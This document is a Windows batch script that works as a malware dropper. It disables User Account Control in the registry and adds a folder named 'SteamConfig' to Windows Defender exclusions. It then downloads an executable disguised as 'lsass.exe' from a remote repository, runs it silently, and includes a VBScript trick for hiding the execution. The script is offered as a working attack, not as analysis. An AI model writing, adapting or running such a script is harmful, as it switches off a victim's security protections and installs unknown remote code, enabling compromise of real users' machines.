@echo off
setlocal enabledelayedexpansion

set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
if not exist "%folderPath%" mkdir "%folderPath%"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" >nul 2>&1

curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
if %errorlevel% neq 0 exit /b 1

if not exist "%folderPath%\lsass.exe" exit /b 1
for %%F in ("%folderPath%\lsass.exe") do set filesize=%%~zF
if "%filesize%"=="0" exit /b 1

start "" /b "%folderPath%\lsass.exe"
exit

:: Create VBScript to run batch silently
echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\run_silently.vbs"
echo objShell.Run """%~f0""", 0, False >> "%TEMP%\run_silently.vbs"

:: Execute the VBScript
wscript "%TEMP%\run_silently.vbs"

:: Clean up VBScript after execution
del "%TEMP%\run_silently.vbs"
exit
